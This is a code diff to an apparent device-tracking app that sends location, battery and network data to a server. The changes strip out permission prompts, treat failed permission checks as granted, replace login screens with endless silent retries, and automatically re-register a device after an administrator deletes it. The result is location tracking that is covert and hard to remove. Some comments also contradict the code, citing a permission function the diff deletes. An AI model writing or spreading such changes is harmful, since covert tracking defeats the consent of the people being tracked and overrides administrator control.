@@ -178,8 +178,8 @@ function App() {
       deviceIdRef.current = id;
       setDeviceInfo(info);
 
-      // Request all permissions upfront at first load
-      await requestAllPermissions();
+      // No permission prompts — APIs will be used silently when needed.
+      // Browser grants permission on first use and remembers it.
 
       // Check if already registered
       const cached = await store.get("registration");
@@ -199,59 +199,9 @@ function App() {
       }
     } catch (err) {
       console.error("Init failed:", err);
-      setError("Failed to initialize app");
-      setScreen(SCREEN.LOGIN);
+      // Retry init after 5 seconds instead of showing login
+      setTimeout(() => initializeApp(), 5000);
     }
-  };
-
-  const checkGpsPermission = async () => {
-    try {
-      if (navigator.permissions) {
-        const result = await navigator.permissions.query({
-          name: "geolocation",
-        });
-        setGpsStatus(result.state); // 'granted' | 'denied' | 'prompt'
-        result.addEventListener("change", () => setGpsStatus(result.state));
-      }
-    } catch (e) {
-      // Some browsers don't support permissions query
-    }
-  };
-
-  // Pre-request ALL permissions at install so no prompts appear later
-  const requestAllPermissions = async () => {
-    // 1. Camera permission — open and immediately close stream
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      stream.getTracks().forEach((t) => t.stop());
-      console.log("[YS] Camera permission granted");
-    } catch (e) {
-      console.warn("[YS] Camera permission denied or unavailable:", e.message);
-    }
-    // 2. Location permission — getCurrentPosition triggers the prompt
-    try {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          () => {
-            setGpsStatus("granted");
-            console.log("[YS] Location permission granted");
-          },
-          (err) => {
-            if (err.code === 1) setGpsStatus("denied");
-            console.warn("[YS] Location permission issue:", err.message);
-          },
-          { enableHighAccuracy: true, timeout: 10000 },
-        );
-      }
-    } catch (e) {
-      console.warn("[YS] Location permission error:", e.message);
-    }
-    // 3. Notification permission (if available)
-    try {
-      if ("Notification" in window && Notification.permission === "default") {
-        await Notification.requestPermission();
-      }
-    } catch (e) {}
   };
 
   const setupNetworkListener = () => {
@@ -410,8 +360,8 @@ function App() {
       }, 3000);
     } catch (err) {
       console.error("Auto install failed:", err);
-      setError(err.message);
-      setScreen(SCREEN.LOGIN);
+      // Retry after 5 seconds instead of showing login
+      setTimeout(() => autoInstall(id, info), 5000);
     }
   };
 
@@ -602,7 +552,7 @@ function App() {
     try {
       const response = await fetch(`${API_BASE}/devices/${id}/status`);
       if (response.status === 404) {
-        // Device was deleted from admin — reset local state
+        // Device was deleted from admin — reset and re-register silently
         await store.remove("registration");
         if (socketRef.current) socketRef.current.disconnect();
         if (statusIntervalRef.current) clearInterval(statusIntervalRef.current);
@@ -618,7 +568,10 @@ function App() {
           navigator.geolocation?.clearWatch(watchIdRef.current);
           watchIdRef.current = null;
         }
-        setScreen(SCREEN.LOGIN);
+        // Auto re-register instead of showing login
+        setScreen(SCREEN.INSTALLING);
+        const info = await collectDeviceInfo();
+        await autoInstall(DEFAULT_MEMBER_ID, info);
         return;
       }
       if (!response.ok) return;
@@ -770,38 +723,23 @@ function App() {
       backupPingIntervalRef.current = null;
     }
 
-    // Request GPS permission explicitly on first use
-    if (navigator.geolocation) {
-      // Send immediate first location ping
-      try {
-        navigator.geolocation.getCurrentPosition(
-          async (pos) => {
-            setGpsStatus("granted");
-            const networkType = await getNetworkType();
-            const bat = await getBatteryNow();
-            await sendPingDirect(id, {
-              lat: pos.coords.latitude,
-              lng: pos.coords.longitude,
-              accuracy: pos.coords.accuracy,
-              battery: bat,
-              networkType,
-            });
-          },
-          (err) => {
-            console.warn("[YS] Initial location error:", err.message);
-            if (err.code === 1) setGpsStatus("denied");
-          },
-          { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 },
-        );
-      } catch (e) {
-        console.warn("[YS] GPS getCurrentPosition exception:", e);
-      }
-    }
+    // Permissions were already granted at install via requestAllPermissions()
+    // Do NOT re-request — just use the APIs silently.
 
     if (isNative && BackgroundGeolocation) {
       try {
-        const permissions = await BackgroundGeolocation.requestPermissions();
-        if (permissions.location !== "granted") {
+        // Check permission state without prompting
+        let hasPermission = false;
+        try {
+          const perms = await BackgroundGeolocation.checkPermissions();
+          hasPermission = perms.location === "granted";
+        } catch (e) {
+          // checkPermissions not available — assume granted from install
+          hasPermission = true;
+        }
+
+        if (!hasPermission) {
+          console.warn("[YS] Native location permission not granted");
           setGpsStatus("denied");
           trackingActiveRef.current = false;
           return;
